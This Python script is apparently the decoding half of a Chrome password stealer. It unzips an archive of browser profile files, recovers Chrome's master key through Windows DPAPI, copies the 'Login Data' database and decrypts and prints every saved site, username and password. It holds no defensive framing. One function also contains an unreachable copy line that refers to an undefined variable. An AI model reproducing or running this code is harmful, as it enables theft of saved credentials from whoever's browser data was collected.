import zipfile
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

temp_db = "Loginvault.db"

def unzip_all(zip_file_path, target_dir):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall(target_dir)

def get_master_key():
    with open('./Local State') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"
    shutil.copy2(login_db, temp_db)  # making a temp copy since Login Data DB is locked while Chrome is running

if __name__ == '__main__':
    unzip_all('./output.zip', '.')
    master_key = get_master_key()
    login_db = shutil.copy2('./Login Data', temp_db)  # making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(
                "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove(temp_db)
    except Exception as e:
        pass